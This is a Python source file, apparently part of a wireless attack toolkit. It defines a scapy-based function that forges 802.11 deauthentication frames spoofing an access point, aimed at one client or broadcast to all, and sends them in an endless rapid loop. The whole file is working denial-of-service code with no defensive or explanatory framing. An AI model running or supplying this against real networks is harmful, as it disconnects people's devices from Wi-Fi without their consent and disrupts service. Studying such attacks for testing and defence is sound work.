from scapy.all import *
import sys
import os
import sys
from extras import printcolor

def deauth(target_mac, gateway_mac, iface):
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    verbose=1
    loop=1
    count=0
    inter=0.00001

    # If not sudo, don't allow to continue
    if not 'SUDO_UID' in os.environ.keys():
        printcolor('RED', "Permission error. You need root privileges for this feature.")
        sys.exit()

    try:
        if count == 0:
            # If count is equal to 0, do endless loop
            loop = 1
            count = None
        else:
            loop = 0
        # Print  info messages"
        if verbose:
            if count:
                print(f"Sending {count} frames every {inter}s...")
            else:
                print(f"Sending frames every {inter}s until CTRL-C is pressed...")

        if target_mac.lower() == 'a':
            dot11 = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=gateway_mac, addr3=gateway_mac)
        else:
            dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)

        # Stack them up
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
        # Send the packet
        sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=0)
    except Exception as e:
        print(f'Error: {e}')
    except KeyboardInterrupt:
        sys.exit()
